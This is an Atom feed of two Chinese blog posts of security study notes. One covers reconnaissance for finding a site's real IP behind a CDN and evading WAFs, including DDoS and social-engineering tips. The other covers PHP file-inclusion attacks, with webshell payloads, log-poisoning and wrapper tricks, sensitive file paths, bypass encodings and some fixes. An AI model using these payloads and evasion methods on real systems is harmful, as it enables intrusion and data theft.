<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mars1y</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-02-26T05:50:52.354Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Mars1y</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试中的信息搜集</title>
    <link href="http://example.com/2024/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    <id>http://example.com/2024/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</id>
    <published>2024-02-25T16:00:00.000Z</published>
    <updated>2024-02-26T05:50:52.354Z</updated>
    
    <content type="html"><![CDATA[<p>​目标网站如果用了 CDN 技术，对于安全测试是有阻碍的，必须想办法绕过，不然测试意义不大。</p><p>​查看目标网站是否用了 CDN 技术，可以超级 ping 一下，看响应 IP 是否都一样。</p><p>​CDN 绕过方法：</p><ol><li><p>子域名查询。如 computer.xxx.edu.cn 和 <a href="http://www.xxx.edu.cn/">www.xxx.edu.cn</a> 是同一个 IP，即使不是同一个 IP ，也可能在同一个网段。此时扫一下存活 IP 或爆一下网段，及扫一下 IP 对应开放端口，就可能找到主站真实 IP 。</p></li><li><p>邮件服务查询。因为外部用户对邮件服务一般访问较少，多为公司内部使用，所以架设 CDN 的可能性不大。但是有可能采用了反向代理技术，即你主动去访问它，可能访问到的只是一个代理。应该让它主动访问你，比如给你发一个邮件，那么就可能暴露该网站的真实 IP 。</p><p>网页端打开它发过来的邮件，右键查看邮件源码，在里面找 IP 。如果你不确定这个是不是主站真实 IP （有可能跟你用其他方法如 <code>ping xxx.com</code> 得到的 IP 不一样），那社工一下。查一下 IP 所在区域，再对比网站备案地址、公司所在位置，地点相近的那个 IP 可能性更大。</p></li><li><p>国外地址请求。有的网站主要用户群体在国内，所以可能针对国外就没有架设 CDN 了。如果用一个国外的地址去访问，就可能得到网站的真实 IP 。</p></li><li><p>遗留文件。如某些用 PHP 写的网站，可能存在 phpinfo.php 这类信息文件，且可以访问，那么里面的 IP 可能就是网站的真实 IP 。</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/1.png"></p></li></ol><p>​<code>inurl:phpinfo.php</code> 。</p><ol start="5"><li>DDoS 。两种方法：<ul><li>收集所有响应 IP ，可能里面就存在真实 IP 。因为可能有些请求就在主机旁边，其响应由主机发出。</li><li>DDoS 一个 CDN ，当这个 CDN 的流量挂了，真实 IP 就暴露了。</li></ul></li><li>DNS 历史记录。有的站可能在一开始没有架设 CDN ，后来因为访问量变大而架设 CDN ，所以查 DNS 历史记录就可能查得到真实 IP 。</li></ol><p>​获取到真实 IP 后，修改本地 hosts 文件，就可以永久绕过 CDN 。</p><hr><p>​大部分网站加或不加 www 访问时，都会访问到同一个网页。如 <code>baidu.com</code> 和 <code>www.baidu.com</code> ，即 www 对应的那个网页。 </p><p>​但是如果该网站架设了 CDN ，那么这两种方式对应的 IP 是不一样的，如百度：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/3.png"></p><p>​因为一般用户访问时都会加上 www ，但为了访问的便利性和网站的一般设置，会设置如下：</p><p>​<img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/2.png"></p><p>​但是一般只有主站会这么设置，CDN 站就只有 www 而没有 * 。</p><p>​所以一般不加 www 的那个 url 的 IP 就是主站 IP 。</p><hr><p>​一般 m.xxx.com 是手机访问时站点，如 m.baidu.com 。</p><hr><p>​信息搜集要完成的任务：</p><ol><li><p>有无 CDN 。</p></li><li><p>编程语言、框架类型或 CMS 类型。</p></li><li><p>操作系统、搭建平台类型（如PHPStudy）、数据库类型。</p><p>一般用第三方搭建平台（PHPStudy、宝塔等）管理站点的，响应包中 Server 字段的内容是比较多的，如 <code>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</code> 。如果是自己下载 Apache、Nginx 等中间件，自己搭建的网站，就不会这么全。</p></li><li><p>有无 WAF ，有 WAF 的一般响应包里会带 <code>X-Powered-By: [xxx]WAF[xxx] </code> 字段。</p><p>先看有没有 WAF 再扫，直接开扫会被 WAF 封锁 IP 。</p><p>一般封 IP 是因为网站识别到你是爬虫程序（UA头判别），所以你可以修改 UA 为官方浏览器的爬虫来绕过。当然如果是针对异常流量封 IP ，那就没办法了。</p></li><li><p>子域名搜集、顶级域名搜集、IP 收集、目录扫描、端口扫描。</p><p>可能该站换过顶级域名，或同时备案了其他顶级域名，如 <code>www.baidu.org</code> 、<code>www.baidu.net</code> 。</p></li><li><p>社工。</p></li></ol><hr><p>​在信息搜集的过程中，要敏锐嗅探，总是询问“这个地方是否可能存在漏洞”。</p><hr><p>​根据关键字进行信息搜集，如网站关键字、xxx 公司、xxx 产品。</p><hr><p>​目录扫描，用工具开扫的话，一般会被 waf 拦截。原因：</p><ol><li>工具发送的请求包的请求方式一般不是 GET 或 POST ，而是响应更快的 HEAD 等，这不符合一般用户使用浏览器的<strong>访问习惯</strong>。</li><li>工具发送请求包的速度很快，不符合一般用户使用浏览器的<strong>访问速度</strong>。</li></ol><p>​绕过思路一般就是围绕这两点展开。绕过方法：</p><ol><li>修改请求方式。</li><li>延时请求。效率很低，不得已的方法。</li><li>修改请求数据包，模拟用户使用浏览器发送的请求。工具的请求包跟浏览器是不一样的，有一些字段没有， UA 头也不一样，所以可根据浏览器的请求包自定义工具的请求包，模拟浏览器发送的请求。</li><li>如果第三种方法由于工具灵活性不高而无法完全自定义，那就写脚本实现。</li></ol><blockquote><p>对于第三和第四种方法，请求包的 UA 头的值可以有两种：浏览器的 UA 头和爬虫引擎。</p><p>如果用浏览器的 UA 头，在不使用延时请求的情况下，也会有因为不符合用户访问速度而被拦截的可能，而如果改成官方的爬虫引擎，如百度的爬虫、360 的爬虫，就可以解决这个问题。</p></blockquote><ol start="5"><li>写脚本+代理池 。爬取网上可用的代理池的 IP ，整合为代理字典，每一个代理发几个包。</li></ol><p>​有时候字典也会被 waf 拦截，如请求备份文件、普通用户不可能访问的文件。waf 识别出此 IP 想请求这些文件，然后进行拦截。这种情况的绕过跟绕文件上传黑名单一样。安全都是相通的，主要是掌握思路并融会贯通。</p><hr><p>​如果是违法网站，可能会经常换域名，但一般标题、关键字这些不会换。此时可以 Google Hack ，搜集更多相关站点。</p><hr><p>​旁注：同服务器（即同 IP ）不同站点。如 <code>1.1.1.1</code> 下 <code>www.a.com</code> 和 <code>www.b.com</code> 。</p><p>​C 段：同网段不同服务器不同站点。如 <code>1.1.1.1</code> 下 <code>www.a.com</code> 和 <code>www.b.com</code> ，<code>1.1.1.2</code> 下 <code>www.c.com</code> 和 <code>www.d.com</code> 。</p><p>​旁注和 C 段都是目标站点攻击不下时，不得已的策略。</p><hr><p>​社工渠道：微信公众号、微信群、QQ群、钉钉群等。混入其中，伪装身份套取信息。</p><hr><p>​学会工具的联动，比如某 waf 封 Xray ，但不封 AWVS ，但是又想用 Xray ，则可以 AWVS - Burp - Xray 联动：AWVS 扫 - Burp 拦截 - 转发到 7070 端口 - Xray 监听 7070 端口。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		目标网站如果用了 CDN 技术，对于安全测试是有阻碍的，必须想办法绕过，不然测试意义不大。	&lt;/p&gt;
&lt;p&gt;​		查看目标网站是否用了 CDN 技术，可以超级 ping 一下，看响应 IP 是否都一样。&lt;/p&gt;
&lt;p&gt;​		CDN 绕过方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li</summary>
      
    
    
    
    <category term="学习笔记" scheme="http://example.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="web安全" scheme="http://example.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞学习</title>
    <link href="http://example.com/2024/02/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://example.com/2024/02/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2024-02-24T16:00:00.000Z</published>
    <updated>2024-02-25T06:10:11.627Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>​文件包含分为两种：</p><ol><li>本地文件包含（Local File Include，简称 LFI），包含服务端的文件。</li><li>远程文件包含（Remote File Include，简称RFI），包含指定 url 的文件。</li></ol><blockquote><p>远程文件包含时，PHP 配置中需要：</p><ul><li><p>allow_url_fopen&#x3D;On(默认为On) ，规定是否允许从远程服务器或者网站检索数据。</p></li><li><p>allow_url_include&#x3D;On(PHP5.2.x之后默认为Off)， 规定是否允许 include&#x2F;require 远程文件。</p></li></ul></blockquote><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p>​包含文件发生错误时，程序警告，但会继续执行。</p><h3 id="include-once"><a href="#include-once" class="headerlink" title="include_once"></a>include_once</h3><p>​和 include 类似，但只包含一次。</p><h3 id="require"><a href="#require" class="headerlink" title="require"></a>require</h3><p>​包含文件发生错误时，程序报错，并直接终止执行。</p><h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h3><p>​和 require 类似，但只包含一次。</p><blockquote><p>上述四个函数，无论包含的是什么类型的文件，都将做为 PHP 代码执行。</p></blockquote><h2 id="敏感信息路径"><a href="#敏感信息路径" class="headerlink" title="敏感信息路径"></a>敏感信息路径</h2><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">C:\ProgramFiles\MySQL\my.ini //MySQL配置文件</span><br><span class="line">C:\ProgramFiles\MySQL\Data\mysql\user.MYD //MySQL root密码</span><br></pre></td></tr></table></figure><h3 id="Linux-Unix"><a href="#Linux-Unix" class="headerlink" title="Linux&#x2F;Unix"></a>Linux&#x2F;Unix</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd //账号密码</span><br><span class="line">/etc/shadow //账号密码</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf //Apache2配置文件</span><br><span class="line">/var/log/apache2/access.log //Apache日志文件</span><br><span class="line">/var/log/apache2/error.log //Apache错误日志</span><br><span class="line">/var/log/nginx/access.log //nginx日志文件</span><br><span class="line">/var/log/nginx/error.log //nginx错误日志</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置文件</span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP配置文件</span><br><span class="line">/etc/httpd/conf/httpd.conf // Apache配置文件</span><br><span class="line">/etc/my.conf //MySQL配置文件文件</span><br><span class="line">/etc/ssh/sshd_config //ssh配置文件</span><br><span class="line">/var/log/auth.log //ssh日志文件</span><br><span class="line">/etc/nginx/nginx.conf //nginx配置文件</span><br><span class="line">/etc/nginx/sites-enabled/default //nginx配置文件</span><br><span class="line">/var/www/html/ //默认网站路径</span><br></pre></td></tr></table></figure><h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><h3 id="获取session文件存储位置"><a href="#获取session文件存储位置" class="headerlink" title="获取session文件存储位置"></a>获取session文件存储位置</h3><ol><li><p>查看 phpinfo：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png"></p></li><li><p>默认位置：Linux 下默认存储在 &#x2F;var&#x2F;lib&#x2F;php&#x2F;session 目录下。</p></li></ol><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​前置知识：session 的文件名为 <code>sess_</code> + sessionid，sessionid 可 F12 查看：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png"></p><p>​测试代码：test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$cmd</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​访问 <code>localhost/test.php?cmd=flag</code> ，查看 session 文件：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png"></p><p>​如果写入 <code>localhost/test.php?cmd=&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;</code> ，那么通过文件包含对应的 session 文件便可 getshell 。</p><h2 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h2><h3 id="web中间件访问日志包含"><a href="#web中间件访问日志包含" class="headerlink" title="web中间件访问日志包含"></a>web中间件访问日志包含</h3><p>Apache（选择性开启一个）</p><ul><li><p>通用访问日志：对应 http.conf 中 <code>##CustomLog &quot;logs/access.log&quot; common</code></p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/15.png"></p></li><li><p>组合访问日志：对应 http.conf 中 <code>#CustomLog &quot;logs/access.log&quot; combined</code></p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/16.png"></p></li></ul><p>Nginx</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/17.png"></p><p>​已知日志文件中会写入访问内容和 User-Agent ，所以我们可以在访问内容（如<code>/xxx/x.php</code>）或 UA 中写入恶意代码（如<code>/xxx/x.php&lt;?php phpinfo();?&gt;</code> ，如果不是在 burp 中写入，注意部分字符需要 url 编码），然后将日志文件包含，即可执行恶意代码。</p><h3 id="SSH日志包含"><a href="#SSH日志包含" class="headerlink" title="SSH日志包含"></a>SSH日志包含</h3><p>​已知 SSH 日志中会写入 SSH 的连接记录，所以我们可以将连接用户名改为恶意代码，用命令连接服务器的 SSH 服务（<code>ssh &quot;&lt;?php phpinfo();?&gt;&quot;@ip地址</code>），然后将 SSH 日志文件包含，即可执行恶意代码。</p><h2 id="environ文件包含"><a href="#environ文件包含" class="headerlink" title="environ文件包含"></a>environ文件包含</h2><p>​environ 文件保存的是当前进程的环境变量，默认位置 &#x2F;proc&#x2F;self&#x2F;environ 。environ 文件只在 Linux 系统中存在。</p><p>​当 php 以 CGI 方式运行时，environ 才会保存 HTTP 请求中的 User-Agent 。所以我们只需要抓包在 User-Agent 里添加恶意代码，然后包含 environ 文件即可执行它。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="拼接包含路径"><a href="#拼接包含路径" class="headerlink" title="拼接包含路径"></a>拼接包含路径</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span>.<span class="string">&quot;.html&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol><li><p>00 截断。</p></li><li><p>路径长度绕过。</p><blockquote><p>前置知识：</p><ul><li>Windows 下最大路径长度为 256B</li><li>Linux 下最大路径长度为 4096B</li></ul><p>漏洞利用条件：php&lt;5.3.10 。</p></blockquote><p>可传入 <code>?file=test.txt././././././(省略若干./)</code> 或  <code>?file=test.txt.........(省略若干.)</code> （注意点号截断只适用于Windows系统），让长度冲到最大路径长度，从而拼接的 .html 被抛弃达到绕过目的。</p></li><li><p>问号绕过：远程文件包含，<code>?file=http://127.0.0.1/test.txt?</code> ，<code>? </code> 将被当作变量的开始，从而拼接的 .html 失效。</p></li><li><p>井号绕过。</p><p>前置知识——HTML &lt;a&gt; 标签的 id 属性：</p><p>id 属性创建一个 HTML 文档书签，书签不会以任何特殊方式显示，即在 HTML 页面中是不显示的，所以对于读者来说是隐藏的。</p><ul><li><p>在 HTML 文档中插入 id</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;tips&quot;</span>&gt;</span>有用的提示部分<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在 HTML 文档中创建一个链接到“有用的提示部分”</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#tips&quot;</span>&gt;</span>访问有用的提示部分<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>或者，从另一个页面创建一个链接到“有用的提示部分”</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.runoob.com/html/html-links.html#tips&quot;</span>&gt;</span>访问有用的提示部分<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p># 是用来指导浏览器动作的，对服务端无用。HTTP 请求中不包括 # ，如访问 <code>https://www.runoob.com/html/html-links.html#tips</code> 时，浏览器实际请求的是 <code>https://www.runoob.com/html/html-links.html</code> ，当浏览器得到 html-links.html 后，再根据 # 的指导进行下一步动作。</p><p>url 中第一个 # 后面出现的任何字符，都会被浏览器解读为位置标识符。这意味着，这些字符都不会被发送到服务器端。比如，<code>http://www.example.com/?color=#fff</code> 的原意是指定一个颜色值，但浏览器实际发出的请求是：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?color=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx</span><br></pre></td></tr></table></figure><p>那么我们传入 <code>?file=http://127.0.0.1/test.txt%23 </code>，远程文件包含时 # 将被解释为位置标识符，从而拼接的 .html 失效。注意使用 url 编码传入，防止传入时就被解释为位置标识符。</p></li><li><p>空格绕过：用于远程文件包含，<code>?file=http://127.0.0.1/test.txt%20</code> ，注意使用 url 编码传入。</p></li></ol><h3 id="过滤-或"><a href="#过滤-或" class="headerlink" title="过滤.或&#x2F;"></a>过滤.或&#x2F;</h3><ol><li><p>url 一次编码绕过</p><ul><li>..&#x2F;<ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e&#x2F;</li></ul></li><li>..\<ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul></li></ul></li><li><p>url 二次编码绕过</p><ul><li>..&#x2F;<ul><li>%252e%252e%252f</li></ul></li><li>..\<ul><li>%252e%252e%255c</li></ul></li></ul></li></ol><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ol><li><p>严格判断文件包含中的参数是否外部可控，如可控，对其进行一系列防御。</p></li><li><p>使用 open_basedir 限制被包含文件的目录。</p><blockquote><p>概述：</p><p>​open_basedir 将 php 所能打开的文件限制在指定的目录树中。当程序要使用例如 fopen() 或 file_get_contents() 打开一个文件时，这个文件的位置将会被检查，当文件在指定的目录树之外，程序将拒绝打开。</p><p>​使用 open_basedir 会影响 I&#x2F;O 性能，导致系统执行变慢。因此需要根据具体需求，在安全与性能上平衡。</p><p>设置方法：</p><ol><li>在 php.ini 中 <code>open_basedir=</code> 设置。</li><li>在 PHP 程序中使用 <code>ini_set(&#39;open_basedir&#39;, &#39;指定目录&#39;);</code> 设置。</li></ol><p>注意事项：</p><p>​用 open_basedir 指定的限制实际上是前缀，不是目录名。也就是说 open_basedir&#x3D;”&#x2F;home&#x2F;fdipzone” 也会允许访问 &#x2F;home&#x2F;fdipzone_abc 。如果要将访问限制设置为目录，请使用斜线结束路径名，例如 open_basedir&#x3D;”&#x2F;home&#x2F;fdipzone&#x2F;“ 。</p><p>​如果要设置多个目录，window 使用 ; 分隔目录，linux 使用 : 分隔目录。</p></blockquote></li><li><p>禁止目录跳转字符如 <code>../</code> 。</p></li><li><p>设置包含文件白名单和黑名单。</p></li><li><p>尽量使用静态包含，即如 <code>include(&quot;main.php&quot;);</code> 。</p></li><li><p>检查 allow_url_fopen 和 allow_url_include 的开关。</p></li><li><p>做好文件权限的管理。</p></li></ol><h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h2 id="file-访问本地文件系统"><a href="#file-访问本地文件系统" class="headerlink" title="file:&#x2F;&#x2F; 访问本地文件系统"></a>file:&#x2F;&#x2F; 访问本地文件系统</h2><ul><li><p>只能访问本地文件。</p></li><li><p>必须使用绝对路径。</p></li></ul><p>示例：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.png"></p><h2 id="php-访问输入-输出流"><a href="#php-访问输入-输出流" class="headerlink" title="php:&#x2F;&#x2F; 访问输入&#x2F;输出流"></a>php:&#x2F;&#x2F; 访问输入&#x2F;输出流</h2><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>​对打开的数据流进行筛选和过滤，常用于读取文件源码。</p><p>​若想获取 PHP 源码，则需先对文件内容进行编码， 因为编码后便不再符合 PHP 语法，会直接输出。如使用 base64 编码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=路径</span></span><br><span class="line"><span class="keyword">or</span></span><br><span class="line">php:<span class="comment">//filter/convert.base64-encode/resource=路径</span></span><br></pre></td></tr></table></figure><p>​示例，包含图片马：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/5.png"></p><h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>​只读流，用于访问原始的请求体数据，但不能用于写入或修改请求体数据。</p><p>​对于 POST 请求，它提供了一种方式来直接读取 POST 请求的原始数据，而不需要依赖 <code>$_POST</code> 或其他类似的超全局变量。</p><p>​当客户端发送 POST 请求时，请求体中的数据通常以表单参数（例如 <code>name=value</code>）或 JSON 格式的数据传输。<code>php://input</code> 可以让你以原始的、未解析的形式访问这些数据，无论是表单数据还是其他类型的数据。</p><p>​通过 <code>file_get_contents(&#39;php://input&#39;)</code> 可以读取整个请求体的内容，并返回一个包含数据的字符串。</p><p>​使用 <code>strlen(file_get_contents(&#39;php://input&#39;))</code> 可以获取请求体数据的长度。</p><p>​当包含文件的路径是通过 GET 传入时，如果把参数值设置为 <code>php://input</code> ，便可在报文主体写入 shell 。注意，当 <code>Content-Type=multipart/form-data</code> 时 php:&#x2F;&#x2F;input 无效。</p><p>​示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/6.png"></p><h2 id="data-数据"><a href="#data-数据" class="headerlink" title="data:&#x2F;&#x2F; 数据"></a>data:&#x2F;&#x2F; 数据</h2><p>​当包含文件的路径是通过参数传入时，可在参数值中配合 data:&#x2F;&#x2F; 写入 shell 。</p><p>​利用条件：</p><ol><li>php&gt;&#x3D;5.2.x</li><li>allow_url_fopen&#x3D;On</li><li>allow_url_include&#x3D;On</li></ol><p>​协议格式：<code>data://资源类型;编码,编码后的内容</code> 或 <code>data://资源类型,内容</code>。</p><p>        常用：<code>data://text/plain,内容</code> 。</p><p>​示例：</p><ol><li>无编码</li></ol><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/7.png"></p><ol start="2"><li>base64 编码</li></ol><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/9.png"></p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/8.png"></p><p>​如果编码后出现 url 特殊字符（如+）：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/10.png"></p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/11.png"></p><p>​则需要手动将特殊字符进行 url 编码再传入（即将+改为%2B）。</p><h2 id="phar-PHP归档"><a href="#phar-PHP归档" class="headerlink" title="phar:&#x2F;&#x2F; PHP归档"></a>phar:&#x2F;&#x2F; PHP归档</h2><p>​PHP 解压缩包的一个伪协议，不管后缀是什么都会当做压缩包来解压。</p><p>​利用条件：</p><ol><li>压缩包需使用 zip 协议压缩</li><li>php&gt;&#x3D;5.3.x</li></ol><p>​示例：</p><ol><li>将 phpinfo.php 用 zip 协议压缩为 phpinfo.zip 。</li><li>上传，访问压缩包里的 phpinfo.php（绝对路径或相对路径均可）。</li></ol><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/12.png"></p><p>​压缩包后缀名(.zip)改为别的也可以，最终都会当作压缩包来处理：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/13.png"></p><h2 id="zip-压缩流"><a href="#zip-压缩流" class="headerlink" title="zip:&#x2F;&#x2F; 压缩流"></a>zip:&#x2F;&#x2F; 压缩流</h2><p>​与 phar:&#x2F;&#x2F; 类似，区别在于：</p><ol><li>只能使用绝对路径。</li><li>要用 # 分隔压缩包和压缩包里的内容，注意 # 要用 url 编码 %23 ，防止被浏览器解释为位置标识符。</li></ol><p>​示例：</p><p><img src="https://raw.githubusercontent.com/Mars1y/ImageHosting/main/blog/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/14.png"></p><p>​同样压缩包后缀(.zip)改为别的也可以。</p><h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1><h2 id="require-once绕过"><a href="#require-once绕过" class="headerlink" title="require_once绕过"></a>require_once绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.anquanke.com/post/id/213235#h2-0">php源码分析 require_once 